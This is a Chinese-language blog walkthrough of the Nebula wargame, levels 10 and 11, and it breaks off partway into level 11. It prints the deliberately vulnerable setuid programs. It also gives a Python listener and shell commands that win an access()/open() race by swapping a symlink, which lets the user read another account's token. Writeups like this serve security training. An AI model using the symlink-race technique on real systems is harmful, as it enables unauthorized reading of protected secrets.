<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Exploit Exercises Nebula level10-14 Writeup &ndash; YYX's WEBlog</title>

    <!-- Meta -->
    <meta name="description" content="YYX's WEBlog &ndash; ">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Social -->
    <meta property="article:author" content="YYX" />
    <meta property="article:section" content="Security" />
    <meta property="article:published_time" content="2014-09-12" />

    <meta property="og:type" content="article"/>
    <meta property="og:title" content="Exploit Exercises Nebula level10-14 Writeup"/>
    <meta property="og:description" content="本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第10级到14级的完整攻略。"/>
    <meta property="og:site_name" content="YYX's WEBlog" />
    <meta property="og:url" content="http://blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html"/>

    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Exploit Exercises Nebula level10-14 Writeup">
    <meta name="twitter:description" content="本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第10级到14级的完整攻略。">
    <meta name="twitter:url" content="http://blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html">

    <!-- Feed -->
    <link rel="alternate" type="application/atom+xml" href="http://blog.yyx.me/feeds/all.atom.xml" title="YYX's WEBlog Atom Feed" />
    <link rel="alternate" type="application/atom+xml" href="http://blog.yyx.me/feeds/security.atom.xml" title="YYX's WEBlog Categories Atom Feed" />
    <link rel="alternate" type="application/rss+xml" href="http://yyxblog.disqus.com/latest.rss" title="YYX's WEBlog Comments RSS Feed">

    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:regular,bold">
    <link rel="stylesheet" type="text/css" href="http://blog.yyx.me/theme/css/w3.css">
    <link rel="stylesheet" type="text/css" href="http://blog.yyx.me/theme/css/style.css">
    <!-- <link rel="stylesheet" type="text/css" href="http://blog.yyx.me/theme/css/jqcloud.css"> -->
    <link rel="stylesheet" type="text/css" href="http://blog.yyx.me/theme/css/font-awesome.min.css">
    <!-- <link rel="stylesheet" type="text/css" href="http://blog.yyx.me/theme/css/pygments-highlight-github.css"> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow-night-eighties.min.css">

    <!-- Icon -->
    <link rel="shortcut icon" type="image/x-icon" href="http://blog.yyx.me//theme/images/favicon-32x32.png">

    <!-- JavaScript -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <!-- <script src="http://blog.yyx.me/theme/js/jqcloud.min.js"></script> -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
    <script src="http://blog.yyx.me/theme/js/main.js"></script>
  </head>

  <body>
    <div class="w3-row w3-card w3-white">
      <header id="header">
        <a href="http://blog.yyx.me/index.html" id="header-logo" title="Home"><img src="http://blog.yyx.me/theme/images/logo_min.png" width="60" height="60"></a>
        <!-- <a href="http://blog.yyx.me" id="header-logo" title="Home">Y</a> -->
        <nav id="header-menu">
          <ul>
            <!-- category -->
            <!-- list -->
            <li class="w3-hover-opacity"><a href="http://blog.yyx.me/archives.html">Archives</a></li>
            <!-- menu item -->
            <li class="w3-border-white w3-hover-opacity"><a href="http://photo.yyx.me" target="_blank">Gallery</a></li>
            <!-- pages -->
            <li class="w3-hover-opacity"><a href="http://blog.yyx.me/pages/about.html">About</a></li>
          </ul>
        </nav>
      </header>
    </div>



    <br><br><br>

    <article>
      <header class="w3-container col-main">
        <h1>Exploit Exercises Nebula level10-14 Writeup</h1>
        <div class="post-info">
          <div class="w3-opacity w3-margin-right w3-margin-bottom" style="flex-grow: 1;">
            <span><time datetime="2014-09-12T22:14:00-07:00">Sep 12, 2014</time> @ <a href="http://blog.yyx.me/category/security.html" title="All articles in category Security">Security</a></span>
          </div>
          <div class="w3-margin-right">
            <span class="w3-tag w3-hover-light-grey yyx-text-yellow yyx-tag-transparent">
              <a href="http://blog.yyx.me/tag/exploit-exercises.html" title="All articles with Exploit-Exercises tag">#exploit-exercises</a>
            </span>
            <span class="w3-tag w3-hover-light-grey yyx-text-yellow yyx-tag-transparent">
              <a href="http://blog.yyx.me/tag/nebula.html" title="All articles with Nebula tag">#nebula</a>
            </span>
            <span class="w3-tag w3-hover-light-grey yyx-text-yellow yyx-tag-transparent">
              <a href="http://blog.yyx.me/tag/wargame.html" title="All articles with Wargame tag">#wargame</a>
            </span>
            <span class="w3-tag w3-hover-light-grey yyx-text-yellow yyx-tag-transparent">
              <a href="http://blog.yyx.me/tag/hacking.html" title="All articles with Hacking tag">#hacking</a>
            </span>
            <span class="w3-tag w3-hover-light-grey yyx-text-yellow yyx-tag-transparent">
              <a href="http://blog.yyx.me/tag/exploit.html" title="All articles with Exploit tag">#exploit</a>
            </span>
          </div>
        </div>
      </header>

      <br>


      <div class="col-main w3-container">
        <section id="content">
          <h1>Nebula level10</h1>
<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
<p>具有SetUID功能的二进制文件flag10在满足access()系统调用的条件下可以上传任何给定文件。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>

  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

<span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#undef HITHERE</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>看到这长长一段C代码……眼前出现“蛋疼”2字，不过题还是要做的，不打小怪兽，怎么当奥特曼？</p>
<p>程序逻辑还是很简单，两个参数，第一个是文件路径，第二个是主机ip。程序通过access验证给定路径的文件是否有读取权限，如果有则对指定ip主机的18211端口发送一个HITHERE的字符串（话说上次给Github的大神写邮件人家也是那么打招呼的……），如果发送成功，就读取文件内容之后发送。</p>
<p>flag10的home目录下有flag10程序和token文件，token对level10没有读取权限。看来又是要绕开权限去读取token的内容。但是应该如何做呢？在翻看了<a href="http://linux.die.net/man/2/access">access()</a>的man手册后发现那么一句话：</p>
<blockquote>
<p>Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
<p>access()验证权限是有风险的，因为在你验证文件和真正open文件的间隙，文件很可能会被利用！</p>
</blockquote>
<p>这个Warning绝对是个完美的Tip，顺顺思路：建立一个假的token文件（有权限读的），然后创建一个软连接指向这个文件。通过验证后利用短暂的间隙，把软连接指向真正的token，这样就狸猫换太子了~</p>
<p>有了思路，如何实现呢？nc可以创建监听，但是没法在nc的途中快速修改软连接指向（毕竟nc是独占的，无法返回）。于是想到了python。<code>which python</code>一下，果然装了python，再<code>python -V</code>，发现python版本2.7.2。直接vim写下python代码（server.py）：</p>
<div class="highlight"><pre><span></span><span class="ch">#! /usr/bin/python</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">18211</span>
<span class="n">BUFSIZ</span> <span class="o">=</span> <span class="mi">4096</span>
<span class="n">ADDR</span> <span class="o">=</span> <span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">tcpSerSock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">tcpSerSock</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">ADDR</span><span class="p">)</span>
<span class="n">tcpSerSock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">print</span> <span class="s1">&#39;waiting for connection...&#39;</span>
    <span class="n">tcpCliSock</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">tcpSerSock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="k">print</span> <span class="s1">&#39;connected!&#39;</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFSIZ</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s1">&#39;.oO Oo.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;get it baby!&#39;</span>
            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ln -fs /home/flag10/token /home/level10/token&#39;</span><span class="p">)</span>
    <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">tcpSerSock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>


<p>退出后使用<code>python server.py</code>让脚本跑起来。这里需要注意的是，对于软连接使用了<code>-f</code>参数，这样可以强制覆盖已经存在的同名软连接文件。之后<code>Ctrl+Alt+F2</code>切换到TTY2，在level10家目录下执行：</p>
<div class="highlight"><pre><span></span>touch fake_token
ln -s fake_token token
</pre></div>


<p>这样文件就伪造好了，然后执行flag10：</p>
<div class="highlight"><pre><span></span>/home/flag10/flag10 ~/token <span class="m">127</span>.0.0.1
</pre></div>


<p>完毕后<code>Ctrl+Alt+F1</code>切回TTY1看结果，<code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>，用这个作为密码登陆flag10并getflag即可。</p>
<p>这里需要留意的是，因为CPU的执行方式是时间片，因此每个进程只有在自己的CPU时间内才能执行相应的指令，也正是因为这个原因，指令的执行之间才有了等待，并有了其他程序执行的可能性。很可能当CPU执行速度过快的时候，你的py程序还没来得及修改软连接，flag10就已经执行到最后了，因此无法读取到正确的token。这时你可以多试验几次，或者想办法降低flag10的优先级（<code>nice</code>可以修改进程优先级），提高py脚本的优先级，以确保py脚本可以替换掉软连接。</p>
<h1>Nebula level11</h1>
<blockquote>
<p>The /home/flag11/flag11 binary processes standard input and executes a shell command.</p>
<p>There are two ways of completing this level, you may wish to do both :-)</p>
<p>flag11会处理标准输入，同时执行一个shell命令。本关有两种方法。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp"></span>

<span class="cm">/*</span>
<span class="cm"> * Return a random, non predictable file, and return the file descriptor for it.</span>
<span class="cm"> */</span>

<span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>

  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> 
    <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> 
    <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
    <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>

  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
  <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>

  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define CL &quot;Content-Length: &quot;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>

  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;reading from stdin&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid header&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>

  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>

    <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>

      <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>

      <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>

      <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
    <span class="p">}</span>  

    <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>
</pre></div>


<p>这题是整个Nebula中最纠结的一题之一，最主要原因是因为代码和二进制程序不符……我查阅了Google中前几页基本所有的Nebula level11的解题思路，发现能作出结果的代码都是Nebula的新LiveCD之前的。所以这里，我们先回到原本的程序。先将上面的代码用root编译，命名成flag11_old，并修改文件权限、所有者、所有组等和flag11一致，然后开始下面的步骤。</p>
<p>首先映入眼帘的是比前面一次更长的代码-_-||| 不过好在代码逻辑还是比较清晰的。这里既然要执行shell，就会定位到<code>system()</code>，而这样就必须要调用<code>process()</code>。可以看到调用发生在<code>main()</code>的第三个if中。所谓的两种方法可能是指走不同的逻辑去执行<code>process()</code>。</p>
<p>观察一下走if为true的这条线：</p>
<div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>第一个条件<code>length &lt; sizeof(buf)</code>很简单，可是，<code>fread()</code>只会返回0或1，也就是说我们要执行的指令只能是1个字节的。但回车也会占用1个字节，我们可以做个试验：</p>
<div class="highlight"><pre><span></span>level11@nebula:/home/flag11$ ./flag11_old
